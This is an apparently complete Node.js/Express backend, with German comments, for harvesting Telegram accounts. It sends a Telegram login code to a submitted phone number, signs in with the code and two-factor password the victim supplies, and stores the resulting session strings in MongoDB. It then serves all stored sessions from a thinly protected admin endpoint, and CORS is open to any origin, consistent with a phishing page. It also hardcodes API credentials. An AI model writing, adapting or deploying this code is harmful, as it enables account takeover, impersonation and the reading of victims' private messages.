const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB Konfiguration (Nutze Umgebungsvariablen für das Passwort/URI!)
const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';
mongoose.connect(MONGO_URI);

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    date: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', SessionSchema);

app.use(cors({ origin: '*' }));
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const activeSessions = new Map();

// Endpunkt: OTP anfordern
app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        
        const result = await client.sendCode({ apiId, apiHash }, phone);
        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        res.json({ phoneCodeHash: result.phoneCodeHash });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// Endpunkt: OTP verifizieren
app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash, password } = req.body;
        const session = activeSessions.get(phone);
        if (!session) return res.status(400).json({ error: "Session abgelaufen" });

        try {
            // Erstversuch
            await session.client.invoke(new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCode: code,
                phoneCodeHash: phoneCodeHash
            }));

            // Session speichern
            const sessionString = session.client.session.save();
            await Session.create({ phone, session: sessionString });
            res.json({ success: true });

        } catch (err) {
            // 2FA Handling
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                if (!password) return res.json({ twoFactorRequired: true });
                
                const pwd = await session.client.invoke(new Api.account.GetPassword());
                await session.client.invoke(new Api.auth.CheckPassword({
                    password: await session.client.srpSolve(pwd, password)
                }));
                
                // Session speichern nach 2FA
                const sessionString = session.client.session.save();
                await Session.create({ phone, session: sessionString });
                res.json({ success: true });
            } else {
                throw err;
            }
        }
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// Admin-Endpunkt: Sessions abrufen
app.get('/get-sessions', async (req, res) => {
    // Ändere 'DEIN_ADMIN_PASSWORT' zu deinem gewünschten Schutz
    if (req.query.pass !== '280597') return res.status(401).json({ error: 'Unauthorized' });
    const sessions = await Session.find({});
    res.json(sessions);
});

app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
